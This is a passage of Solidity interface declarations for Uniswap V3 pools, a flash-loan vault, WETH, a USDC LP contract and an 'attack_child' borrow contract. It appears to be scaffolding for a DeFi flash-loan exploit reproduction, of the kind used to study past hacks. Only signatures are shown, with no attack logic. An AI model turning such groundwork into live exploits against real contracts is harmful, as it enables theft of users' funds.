interface IUSDC_USDC_LP {
    function deposit(uint256, uint256, uint256, uint256) external;
    function getAssets() external view;
    function withdraw(uint256) external;
}

interface IUniswapV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV3Pool_A443 {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IUniswapV3Pool_E8D0 {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IVault_BA1222 {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IWETH {
    function withdraw(uint256) external;
}

interface Iattack_child {
    function borrow(uint256) external;
}
